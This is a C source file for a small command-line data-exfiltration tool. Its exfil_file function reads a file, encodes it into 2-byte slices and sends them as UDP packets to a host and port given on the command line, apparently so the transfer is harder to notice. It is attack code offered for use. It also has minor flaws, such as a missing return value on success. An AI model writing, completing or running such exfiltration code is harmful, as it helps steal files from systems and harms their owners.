#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "encoder.h"
#include "network.h"
#include "test.h"

#define MAX_BUFF 4096

int exfil_file(const char* path, const char* host, const int port);

void print_help() {
    puts("-[-v]ersion - current version\n"
         "-[-t]est    - run the test suite if compiled in debug mode\n"
         "-[-f]ile    - the path to the file to send\n"
         "-[-p]ort    - the server port to connect to\n"
         "-[-h]ost    - the host to connect to\n"
         "--help      - this message\n");
}

int main(int argc, char** argv) {
    int port         = 34854;
    const char* path = 0;
    const char* host = 0;
    int choice;

    while (1) {
        int option_index = 0;

#ifndef NDEBUG
#define OPTSTR "vtp:f:h:"
        static struct option long_options[]
            = {{"version", no_argument, 0, 'v'}, {"test", no_argument, 0, 't'},
                {"file", required_argument, 0, 'f'}, {"host", required_argument, 0, 'h'},
                {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
#else
#define OPTSTR "vp:f:h:"
        static struct option long_options[] = {{"version", no_argument, 0, 'v'},
            {"file", required_argument, 0, 'f'}, {"host", required_argument, 0, 'h'},
            {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
#endif

        choice = getopt_long(argc, argv, OPTSTR, long_options, &option_index);
        if (choice == -1)
            break;
        switch (choice) {
            case 'v':
                puts("v0.1");
                break;
            case 'p':
                port = atoi(optarg);
                break;
            case 'f':
                path = optarg;
                break;
            case 'h':
                host = optarg;
                break;
#ifndef NDEBUG
            case 't':
                run_encoders_tests();
                return EXIT_SUCCESS;
#endif
            case '?':
            default:
                print_help();
                return EXIT_FAILURE;
        }
    }

    if (!host || !path || !port) {
        print_help();
        return EXIT_FAILURE;
    }

    return exfil_file(path, host, port);
}

int exfil_file(const char* path, const char* host, const int port) {
    struct sockaddr_storage storage;
    make_storage(&storage, host, port);

    encoder_frame_t enc;

    FILE* fp = fopen(path, "r");
    if (!fp) {
        perror("error opening file");
        return 1;
    }

    uint8_t buffer[MAX_BUFF + 1];

    size_t len = fread(buffer, sizeof(uint8_t), MAX_BUFF, fp);

    if (ferror(fp)) {
        fputs("Error reading file", stderr);
    } else {
        buffer[len++] = '\0';//just to be safe
    }

    fclose(fp);

    outbound_encoder_init(&enc, buffer, len, 2);

    uint8_t slice[2];
    while (!encoder_finished(&enc)) {
        encoder_get_next(&enc, slice);
        insert_udp_slice(&storage, slice);
    }
}
